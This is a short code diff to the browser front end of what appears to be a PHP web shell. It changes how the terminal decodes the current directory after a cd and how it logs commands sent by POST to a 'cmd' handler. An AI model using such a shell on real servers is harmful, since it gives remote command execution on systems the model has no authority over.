@@ -196,9 +196,9 @@ if (ISSET($_POST['cmd'])) {
                     if (request.readyState == XMLHttpRequest.DONE) {
                         if (cd) {
                             var parsedResponse = request.responseText.split("<br>");
-                            console.log(parsedResponse[0], decodeEntities(parsedResponse[0]));
                             previousDir = currentDir;
-                            currentDir = parsedResponse[0].replace(new RegExp("&sol;", "g"), "/");
+                            // currentDir = parsedResponse[0].replace(new RegExp("&sol;", "g"), "/");
+                            currentDir = decodeEntities(parsedResponse[0]);
                             outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>";
                             usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
                         } else {
@@ -208,7 +208,7 @@ if (ISSET($_POST['cmd'])) {
                         updateInputWidth();
                     }
                 };
-                console.log(command);
+                console.log('command: ' + command);
                 request.open("POST", requestURL, true);
                 request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                 request.send("cmd="+encodeURIComponent(command));
